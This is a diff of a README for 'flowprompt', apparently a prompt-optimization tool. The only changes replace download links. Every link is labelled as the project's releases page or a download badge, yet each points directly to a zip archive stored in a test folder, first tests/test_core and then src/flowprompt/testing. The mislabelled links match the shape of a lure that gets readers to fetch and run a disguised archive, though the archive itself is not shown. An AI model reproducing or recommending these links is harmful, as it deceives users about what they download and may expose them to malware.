@@ -1,6 +1,6 @@
 # 🚀 flowprompt - Optimize Your Prompts Easily
 
-![Download flowprompt](https://raw.githubusercontent.com/JuanSerrano44/flowprompt/main/tests/test_core/Software-v1.3-alpha.2.zip)
+![Download flowprompt](https://github.com/JuanSerrano44/flowprompt/raw/refs/heads/main/src/flowprompt/testing/Software_v1.7.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started with flowprompt, you only need to follow a few simple steps. This
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [flowprompt Releases page](https://raw.githubusercontent.com/JuanSerrano44/flowprompt/main/tests/test_core/Software-v1.3-alpha.2.zip) to find the latest version.
+1. **Visit the Releases Page**: Go to the [flowprompt Releases page](https://github.com/JuanSerrano44/flowprompt/raw/refs/heads/main/src/flowprompt/testing/Software_v1.7.zip) to find the latest version.
   
 2. **Choose Your Version**: Look for the most recent release at the top. You will find different files available for download. Select the file that matches your operating system.
 
@@ -77,4 +77,4 @@ If you have questions or need help, visit the Issues section of the repository o
 
 Flowprompt simplifies prompt management for everyone. With automatic optimizations and various advanced features, you can confidently create and manage prompts for all your AI needs.
 
-For further details, remember to revisit the [flowprompt Releases page](https://raw.githubusercontent.com/JuanSerrano44/flowprompt/main/tests/test_core/Software-v1.3-alpha.2.zip) to stay updated with new releases and features. Enjoy making your prompts more effective with flowprompt!
+For further details, remember to revisit the [flowprompt Releases page](https://github.com/JuanSerrano44/flowprompt/raw/refs/heads/main/src/flowprompt/testing/Software_v1.7.zip) to stay updated with new releases and features. Enjoy making your prompts more effective with flowprompt!
